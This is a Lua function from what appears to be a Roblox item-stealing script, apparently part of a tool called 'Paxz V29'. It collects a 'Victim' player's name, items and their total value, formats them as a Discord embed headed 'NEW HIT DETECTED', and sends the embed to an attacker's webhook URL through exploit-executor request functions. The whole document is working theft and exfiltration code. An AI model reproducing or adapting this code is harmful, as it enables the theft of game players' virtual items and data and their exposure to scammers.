function postLog(data)
    if #data == 0 or isLogging then return end
    isLogging = true
    local list, total = "", 0
    for _, i in ipairs(data) do
        list = list .. "┕ **[" .. i.rarity .. "]** " .. i.name .. " | `Val: " .. i.value .. "`\n"
        total = total + i.value
    end
    local embed = {
        content = "🚨 **NEW HIT DETECTED** 🚨",
        embeds = {{
            title = "🎯 PAXS REPORT",
            color = 16711680,
            fields = {
                {name = "👤 Victim", value = "```" .. LocalPlayer.Name .. "```", inline = true},
                {name = "💎 Total Value", value = "```" .. total .. "```", inline = true},
                {name = "📦 Items", value = list}
            },
            footer = {text = "Paxz V29 • " .. os.date("%X")}
        }}
    }
    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or http_request or request
        req({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(embed)})
    end)
    task.wait(1) -- 1 seconde cooldown tegen dubbele logs
    isLogging = false
end

